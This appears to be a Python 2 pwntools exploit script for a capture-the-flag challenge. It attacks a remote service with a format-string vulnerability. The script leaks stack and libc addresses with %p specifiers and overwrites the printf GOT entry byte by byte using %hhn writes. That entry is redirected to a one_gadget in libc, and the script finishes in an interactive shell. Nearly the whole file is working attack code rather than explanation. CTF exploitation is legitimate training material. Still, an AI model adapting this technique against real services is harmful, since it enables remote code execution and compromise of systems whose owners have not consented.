#! /usr/bin/env python

from pwn import *


def takeFirst(e):
    return e[0]

io = remote("csie.ctf.tw", 10130)
#io = remote("localhost", 8888)

raw_input('@')

fmt_leak_stack = '%6$p'
fmt_leak_libc = '%11$p'
fmt_leak_text = '%7$p'
MARK = 'AAAA'

io.sendafter(':)',fmt_leak_stack + MARK + fmt_leak_libc + MARK + fmt_leak_text + MARK)
leak_stack = int(io.recvuntil(MARK, True), 16)
leak_libc = int(io.recvuntil(MARK, True), 16)
leak_text = int(io.recvuntil(MARK, True), 16)

#io.send('%6$p\n%7$p\n%8$p\n%9$p\n%10$p\n%11$p\n%12$p\n%13$p\n%14$p\n%15$p\n%16$p\n%17$p\n%18$p\nAAAA')
#print io.recvuntil(MARK, True)
# libc_index is the index of __libc_start_main in libc
libc_index = 0x21ab0 + 0xe7
libc_base = leak_libc - libc_index

print "libc base: "+hex(libc_base)
print "text base: "+hex(leak_text)

# use one gadget to exploit
one_gadget = libc_base + 0x4f440

printf_got = leak_text + 0x2004da

print hex(one_gadget)
print hex(printf_got)

p2cursor = 6
cursor = 8

cursor_low = (leak_stack + 0x10)%0x100

# use p2cursor to control cursor to write address to memset@got 
# write $rsp+0x20, point to memset@got + 1
printf_got_low = (printf_got%0x100) + 1
printf_got_mid = (printf_got/0x100)%0x100
printf_got_high = (printf_got/0x10000)%0x100

fmt_printf_got_low = '%' + str(printf_got_low) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
io.send(fmt_printf_got_low)

fmt_mv_cursor = '%' + str(cursor_low+1) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_mv_cursor)

fmt_printf_got_mid = '%' + str(printf_got_mid) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_printf_got_mid)

fmt_mv_cursor = '%' + str(cursor_low+2) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_mv_cursor)

fmt_printf_got_high = '%' + str(printf_got_high) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_printf_got_high)

# write at $rsp+0x18, point to memset@got
printf_got_low = (printf_got%0x100)

cursor_low = cursor_low - 0x8

fmt_mv_cursor = '%' + str(cursor_low) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_mv_cursor)

fmt_printf_got_low = '%' + str(printf_got_low) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_printf_got_low)

fmt_mv_cursor = '%' + str(cursor_low+1) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_mv_cursor)

fmt_printf_got_mid = '%' + str(printf_got_mid) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_printf_got_mid)

fmt_mv_cursor = '%' + str(cursor_low+2) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_mv_cursor)

fmt_printf_got_high = '%' + str(printf_got_high) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
io.sendafter( MARK, fmt_printf_got_high)

# write at $rsp+0x28, point to memset@got+2
# have to write 6 bytes this time.
temp_printf_got = printf_got
cursor_low = cursor_low + 0x10

for i in range(0,6):
    printf_got_byte = temp_printf_got%0x100
    temp_printf_got /= 0x100
    if i == 0:
        printf_got_byte += 2

    fmt_mv_cursor = '%' + str(cursor_low + i) + 'c' + '%' + str(p2cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_mv_cursor)
    fmt_printf_got = '%' + str(printf_got_byte) + 'c'+ '%' + str(cursor) + '$hhn' + MARK
    io.sendafter( MARK, fmt_printf_got)

# calculate libc_base by leaking got
#fmt_leak_libc = '%10$s' + MARK + MARK
#io.sendafter( MARK, fmt_leak_libc )
#leak_libc = u64(io.recvuntil( MARK , True ).ljust(8, '\x00'))
#libc_base = leak_libc - 0x9ed40
#print "Another libc_base: "+ hex(libc_base)

#io.sendafter(MARK, '%6$p\n%7$p\n%8$p\n%9$p\n%10$p\n%11$p\n%12$p\n%13$p\n%14$p\n%15$p\n%16$p\n%17$p\n%18$p\n' + MARK*2)
#print io.recvuntil(MARK, True)


# hijecting the got

onegadget_low = one_gadget%0x100                # 1 byte
onegadget_mid = (one_gadget/0x100)%0x100        # 1 byte
onegadget_high = (one_gadget/0x10000)%0x100     # 1 byte

fmt_list = [ (onegadget_low, 9), (onegadget_mid, 10), (onegadget_high, 11) ]    # (value_want_to_write, position_to_write)

fmt_list.sort(key=takeFirst)


raw_input('ready for the final fmt!')
fmt_overwrite_got = ''
pre = 0
for i in range(0,3):
    fmt_overwrite_got += '%' + str(fmt_list[i][0] - pre) + 'c' + '%' + str(fmt_list[i][1]) +'$hhn'
    pre = fmt_list[i][0]
fmt_overwrite_got += MARK
io.sendafter( MARK, fmt_overwrite_got)


io.interactive()
